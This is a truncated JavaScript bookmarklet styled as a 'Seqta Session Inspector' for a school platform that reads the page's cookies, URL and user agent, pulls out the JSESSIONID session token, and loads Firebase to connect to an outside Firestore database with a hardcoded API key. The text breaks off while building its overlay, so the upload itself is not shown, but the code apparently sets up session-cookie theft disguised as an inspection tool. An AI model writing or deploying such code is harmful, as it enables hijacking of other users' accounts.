(function() {
  // 1. CONFIGURATION
  const firebaseConfig = {
    apiKey: "AIzaSyAuWzbauhK86FC-yc8RkcXftQAhdHexrpE",
    authDomain: "bookmarklet-backend.firebaseapp.com",
    projectId: "bookmarklet-backend",
    storageBucket: "bookmarklet-backend.firebasestorage.app",
    messagingSenderId: "447001590035",
    appId: "1:447001590035:ios:c13149711eac0631f702e6"
  };
  const OCTO_URL = 'https://octoarcade.vercel.app';

  // 2. DATA COLLECTION
  const cookies = document.cookie;
  const url = location.href;
  const ua = navigator.userAgent;
  
  // Try to extract JSESSIONID automatically first
  const sessionMatch = cookies.match(/JSESSIONID=([^;]+)/);
  const autoSessionId = sessionMatch ? sessionMatch[1] : "NO_SESSION_FOUND";

  // 3. FIREBASE INITIALIZATION
  const loadScript = (src, callback) => {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    document.head.appendChild(script);
  };

  loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js", () => {
    loadScript("https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js", () => {
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();
      db.settings({ experimentalForceLongPolling: true });

      // 4. CREATE THE "SESSION INSPECTOR" UI
      const overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(8px);';
      overlay.id = 'octoInspector';

      const card = document.createElement('div');
      card.style.cssText = 'background:#1e293b;color:white;padding:30px;border-radius:12px;max-width:550px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.6);font-family:sans-serif;max-height:90vh;overflow-y:auto;';
      
      const html = `
        <h2 style="margin:0 0 10px 0;color:#4f46e5;display:flex;align-items:center;gap:10px;">
          🔍 Seqta Session Inspector
        </h      `;
